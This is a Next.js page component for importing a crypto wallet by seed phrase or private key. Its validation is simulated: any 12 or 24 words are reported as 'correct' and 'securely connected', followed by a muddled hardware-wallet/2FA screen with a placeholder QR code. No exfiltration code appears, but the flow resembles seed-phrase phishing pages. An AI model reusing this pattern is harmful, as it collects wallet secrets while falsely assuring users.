'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

// --- HELPER ---


// --- SVG ICONS ---
const PasteIcon = (props: React.SVGProps<SVGSVGElement>) => (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" {...props}>
        <rect x="3" y="3" width="18" height="18" rx="4" fill="#2563EB"/>
        <path d="M9 8H15" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
        <path d="M9 12H15" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
        <path d="M9 16H12" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
    </svg>
);

const ConfirmationIcon = (props: React.SVGProps<SVGSVGElement>) => (
    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" {...props}>
        <circle cx="32" cy="32" r="32" fill="#10B981"/>
        <path d="M20 32L28 40L44 24" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
);

const ErrorIcon = (props: React.SVGProps<SVGSVGElement>) => (
    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" {...props}>
        <circle cx="32" cy="32" r="32" fill="#EF4444"/>
        <path d="M24 24L40 40M40 24L24 40" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
);


// --- UI COMPONENTS ---

const SeedPhraseConfirmedCard = ({ onGetStarted }: { onGetStarted: () => void }) => {
    return (
        <div className="w-full max-w-90 bg-[#1E293B] border border-slate-800 rounded-2xl shadow-2xl p-8 md:p-12 flex flex-col items-center" style={{ padding: '80px' }}>
            <ConfirmationIcon className="mb-6"/>
            
            <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3" style={{ marginTop: '15px' }}>Seed Phrase Confirmed</h1>
                <p className="text-gray-400 text-sm mb-10 max-w-xs mx-auto leading-relaxed">
                    Your 24 words are correct. You&apos;re securely connected to your wallet.
                </p>
            </div>
            
            <button
                type="button"
                onClick={onGetStarted}
                className="w-full bg-blue-600 text-white font-semibold h-12 rounded-lg text-base hover:bg-blue-700 transition-colors shadow-lg shadow-blue-600/20 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500"
                style={{ marginTop: '30px' }}
            >
                Get Started
            </button>
        </div>
    );
};

const InvalidSeedPhraseCard = ({ onTryAgain }: { onTryAgain: () => void }) => {
    return (
        <div className="w-full max-w-90 bg-[#1E293B] border border-slate-800 rounded-2xl shadow-2xl p-8 md:p-12 flex flex-col items-center" style={{ padding: '80px' }}>
            <ErrorIcon className="mb-6"/>
            
            <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3" style={{ marginBottom: '15px' }}>Invalid Seed Phrase</h1>
                <p className="text-gray-400 text-sm mb-10 max-w-xs mx-auto leading-relaxed" style={{ marginBottom: '30px' }}>
                    The words entered don&apos;t match. Please double-check your 24-word recovery phrase and try again.
                </p>
            </div>
            
            <button
                type="button"
                onClick={onTryAgain}
                className="w-full bg-blue-600 text-white font-semibold h-12 rounded-lg text-base hover:bg-blue-700 transition-colors shadow-lg shadow-blue-600/20 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500"
                
            >
                Try again
            </button>
        </div>
    );
};

const ImportHardwareWalletCard = ({ onProceed }: { onProceed: () => void }) => {
    return (
        <div className="w-full max-w-100 bg-[#1E293B] border border-slate-800 rounded-2xl shadow-2xl p-8 md:p-12 flex flex-col items-center" style={{ padding: '30px' }}>
            
            <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3" style={{ marginBottom: '15px' }}>Import with hardware wallet</h1>
                <p className="text-gray-400 text-sm mb-8 max-w-xs mx-auto leading-relaxed" style={{ marginBottom: '30px' ,paddingLeft: '30px', paddingRight: '30px' }}>
                    Download Google authenticator app on playstore or iOS store and scan the code below to activate the 2FA
                </p>
            </div>

            <div className="p-4 bg-white rounded-lg mb-8">
                <img 
                    src="https://placehold.co/200x200/000000/FFFFFF?text=QR+CODE" 
                    alt="QR Code Placeholder"
                    width={200}
                    height={200}
                />
            </div>
            
            <button
                type="button"
                onClick={onProceed}
                className="w-full bg-blue-600 text-white font-semibold h-12 rounded-lg text-base hover:bg-blue-700 transition-colors shadow-lg shadow-blue-600/20 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500"
                style={{ marginTop: '30px' }}
            >
                Proceed
            </button>
        </div>
    );
};

const ImportWithSeedPhraseCard = () => {
    const [seedPhrase, setSeedPhrase] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showPopup, setShowPopup] = useState<'none' | 'confirmed' | 'invalid' | 'hardware'>('none');
    const router = useRouter();

    const handlePaste = async () => {
        try {
            const text = await navigator.clipboard.readText();
            setSeedPhrase(text);
            toast.success('Seed phrase pasted successfully!');
        } catch (err) {
            toast.error('Failed to paste from clipboard');
        }
    };

    const validateSeedPhrase = (phrase: string) => {
        const words = phrase.trim().split(/\s+/);
        
        // Check if it's a private key (typically 64 hex characters)
        if (/^[a-fA-F0-9]{64}$/.test(phrase.replace(/\s/g, ''))) {
            return 'private_key';
        }
        
        // Check if it's a valid seed phrase (12 or 24 words)
        if (words.length === 12 || words.length === 24) {
            // Simple validation - check if all words are at least 3 characters
            const validWords = words.every(word => word.length >= 3);
            return validWords ? 'seed_phrase' : 'invalid';
        }
        
        return 'invalid';
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        // Validation
        if (!seedPhrase.trim()) {
            setShowPopup('invalid');
            return;
        }

        setIsLoading(true);
        
        try {
            // Simulate processing
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            const validationType = validateSeedPhrase(seedPhrase);
            
            if (validationType === 'private_key' || validationType === 'seed_phrase') {
                setShowPopup('confirmed');
            } else {
                setShowPopup('invalid');
            }
            
        } catch (error) {
            toast.error('Something went wrong. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    const handleGetStarted = () => {
        setShowPopup('hardware');
    };

    const handleTryAgain = () => {
        setShowPopup('none');
        setSeedPhrase('');
    };

    const handleProceed = async () => {
        try {
            toast.success('Hardware wallet setup complete! Redirecting...');
            
            setTimeout(() => {
                router.push('/boardingscreens/boarding8');
            }, 1500);
            
        } catch (error) {
            toast.error('Failed to complete setup. Please try again.');
        }
    };

    if (showPopup === 'confirmed') {
        return <SeedPhraseConfirmedCard onGetStarted={handleGetStarted} />;
    }

    if (showPopup === 'invalid') {
        return <InvalidSeedPhraseCard onTryAgain={handleTryAgain} />;
    }

    if (showPopup === 'hardware') {
        return <ImportHardwareWalletCard onProceed={handleProceed} />;
    }

    return (
        <div className="w-full max-w-175 bg-[#1E293B] border border-slate-800 rounded-2xl shadow-2xl p-8 md:p-12" style={{ padding: '100px' }}>
            <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3">Import with seed phrase and private key</h1>
                <p className="text-gray-400 text-sm mb-10 max-w-sm mx-auto leading-relaxed" style={{marginLeft:'50px',marginBottom:'30px',marginTop:'20px'}}>
                    Supports 12-word and 24-word seed phrases as well as private key imports. When entering a seed phrase, separate each word with a space.
                </p>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative">
                    <textarea
                        rows={4}
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        placeholder="import with seed phrase or private key"
                        className="w-full bg-slate-800 border border-slate-700 rounded-lg p-4 text-sm text-gray-200 placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none pr-12"
                        style={{paddingLeft:'10px',paddingTop:'10px',paddingBottom:'10px'}}
                        disabled={isLoading}
                    />
                    <button 
                        type="button" 
                        onClick={handlePaste}
                        className="absolute top-4 right-4 text-blue-400 hover:text-blue-300"
                        disabled={isLoading}
                    >
                         <PasteIcon className="w-6 h-6" />
                    </button>
                </div>

                <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-blue-600 text-white font-semibold h-12 rounded-lg text-base hover:bg-blue-700 disabled:bg-slate-600 disabled:cursor-not-allowed transition-colors shadow-lg shadow-blue-600/20 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500 !mt-8"
                >
                    {isLoading ? 'Validating...' : 'Confirm'}
                </button>
            </form>
        </div>
    );
};


// --- MAIN PAGE ---

export default function ImportSeedPhrasePage() {
  return (
    <div className="min-h-screen w-full bg-[#0F172A] text-gray-200 flex flex-col items-center justify-center p-4 font-sans">
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        .font-sans { font-family: 'Inter', sans-serif; }
        body {
            background-color: #0F172A;
            background-image: 
                radial-gradient(circle at top left, rgba(30, 64, 175, 0.15), transparent 40%),
                radial-gradient(circle at bottom right, rgba(30, 64, 175, 0.15), transparent 40%);
        }
      `}</style>
      
      <main className="flex-grow flex items-center justify-center w-full">
          <ImportWithSeedPhraseCard />
      </main>

      {/* Toast Container */}
      <ToastContainer
        position="top-right"
        autoClose={3000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="dark"
        toastStyle={{
          backgroundColor: '#1E293B',
          color: '#F1F5F9',
          border: '1px solid #475569'
        }}
      />
    </div>
  );
}

